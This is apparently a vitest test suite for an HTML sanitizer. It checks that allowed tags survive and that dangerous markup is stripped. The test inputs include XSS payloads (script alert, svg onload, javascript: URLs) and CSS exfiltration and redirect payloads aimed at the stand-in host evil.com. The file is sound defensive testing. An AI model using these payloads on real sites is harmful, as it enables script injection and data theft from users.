import { describe, it, expect } from 'vitest'
import { JSDOM } from 'jsdom'

// DOMPurify requires a DOM — set up jsdom globals before importing
const dom = new JSDOM('<!DOCTYPE html>')
// eslint-disable-next-line @typescript-eslint/no-explicit-any
;(globalThis as any).window = dom.window
// eslint-disable-next-line @typescript-eslint/no-explicit-any
;(globalThis as any).document = dom.window.document

// Dynamic import after DOM globals are available
const { sanitizeHtml } = await import('./sanitize-html')

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** Parse sanitized HTML and return the root element for assertions */
function parse(html: string): Document {
  return new JSDOM(sanitizeHtml(html)).window.document
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('sanitizeHtml – whitelist approach', () => {
  // ---- Allowed content ----

  it('keeps basic formatting tags', () => {
    const input = '<p>Hello <b>world</b> <em>!</em></p>'
    const out = sanitizeHtml(input)
    expect(out).toContain('<b>world</b>')
    expect(out).toContain('<em>!</em>')
    expect(out).toContain('<p>')
  })

  it('keeps tables', () => {
    const input = '<table><thead><tr><th>H</th></tr></thead><tbody><tr><td>D</td></tr></tbody></table>'
    const out = sanitizeHtml(input)
    expect(out).toContain('<table>')
    expect(out).toContain('<td>D</td>')
  })

  it('keeps safe links with https href', () => {
    const out = sanitizeHtml('<a href="https://example.com">link</a>')
    const doc = parse('<a href="https://example.com">link</a>')
    const a = doc.querySelector('a')
    expect(a).not.toBeNull()
    expect(out).toContain('href="https://example.com"')
  })

  it('keeps images with https src', () => {
    const out = sanitizeHtml('<img src="https://example.com/img.png" alt="pic">')
    expect(out).toContain('src="https://example.com/img.png"')
    expect(out).toContain('alt="pic"')
  })

  // ---- Blocked tags (previously bypassed with blacklist) ----

  it('strips <script> tags', () => {
    const out = sanitizeHtml('<script>alert(1)</script>')
    expect(out).not.toContain('<script')
    expect(out).not.toContain('alert')
  })

  it('strips <iframe> tags', () => {
    const out = sanitizeHtml('<iframe src="https://evil.com"></iframe>')
    expect(out).not.toContain('<iframe')
  })

  it('strips <style> tags (CSS exfiltration vector)', () => {
    const out = sanitizeHtml('<style>body { background-image: url(https://evil.com/?leak) }</style>')
    expect(out).not.toContain('<style')
    expect(out).not.toContain('background-image')
  })

  it('strips <object> and <embed> tags', () => {
    const out = sanitizeHtml('<object data="x"></object><embed src="y">')
    expect(out).not.toContain('<object')
    expect(out).not.toContain('<embed')
  })

  it('strips <form> tags', () => {
    const out = sanitizeHtml('<form action="https://evil.com"><input type="text"></form>')
    expect(out).not.toContain('<form')
    expect(out).not.toContain('<input')
  })

  it('strips <base> tag (URL redirect vector)', () => {
    const out = sanitizeHtml('<base href="https://evil.com/">')
    expect(out).not.toContain('<base')
  })

  it('strips <meta> tag (refresh redirect vector)', () => {
    const out = sanitizeHtml('<meta http-equiv="refresh" content="0;url=https://evil.com">')
    expect(out).not.toContain('<meta')
  })

  it('strips SVG elements (event handler vector)', () => {
    const out = sanitizeHtml('<svg onload="alert(1)"><circle r="10"/></svg>')
    expect(out).not.toContain('<svg')
    expect(out).not.toContain('onload')
  })

  // ---- Blocked attributes ----

  it('strips inline style attributes (CSS exfiltration)', () => {
    const out = sanitizeHtml('<p style="background-image: url(https://evil.com/?data)">text</p>')
    expect(out).not.toContain('style=')
    expect(out).not.toContain('background-image')
    expect(out).toContain('text')
  })

  it('strips all event handler attributes', () => {
    const handlers = [
      'onerror', 'onload', 'onclick', 'onmouseover',
      'onfocus', 'onblur', 'onmouseenter', 'ontransitionend',
      'onanimationend', 'onchange', 'oninput',
    ]
    for (const h of handlers) {
      const out = sanitizeHtml(`<div ${h}="alert(1)">x</div>`)
      expect(out).not.toContain(`${h}=`)
    }
  })

  it('strips data-* attributes', () => {
    const out = sanitizeHtml('<div data-secret="token123">x</div>')
    expect(out).not.toContain('data-secret')
  })

  // ---- URL scheme validation ----

  it('strips javascript: URLs from href', () => {
    const out = sanitizeHtml('<a href="javascript:alert(1)">click</a>')
    expect(out).not.toContain('javascript:')
  })

  it('strips javascript: URLs from img src', () => {
    const out = sanitizeHtml('<img src="javascript:alert(1)">')
    expect(out).not.toContain('javascript:')
  })

  it('strips data: URLs that are not images from img src', () => {
    const out = sanitizeHtml('<img src="data:text/html,<script>alert(1)</script>">')
    expect(out).not.toContain('data:text/html')
  })

  it('allows data:image/png;base64 for img src', () => {
    const src = 'data:image/png;base64,iVBOR='
    const out = sanitizeHtml(`<img src="${src}">`)
    expect(out).toContain(src)
  })

  it('allows mailto: URLs in href', () => {
    const out = sanitizeHtml('<a href="mailto:user@example.com">email</a>')
    expect(out).toContain('mailto:user@example.com')
  })

  // ---- Link safety ----

  it('adds rel="noopener noreferrer nofollow" to links', () => {
    const out = sanitizeHtml('<a href="https://example.com">x</a>')
    expect(out).toContain('noopener')
    expect(out).toContain('noreferrer')
    expect(out).toContain('nofollow')
  })

  it('adds target="_blank" to links', () => {
    const out = sanitizeHtml('<a href="https://example.com">x</a>')
    expect(out).toContain('target="_blank"')
  })

  // ---- KEEP_CONTENT ----

  it('preserves text content of stripped tags', () => {
    const out = sanitizeHtml('<custom-element>Hello world</custom-element>')
    expect(out).toContain('Hello world')
    expect(out).not.toContain('custom-element')
  })
})
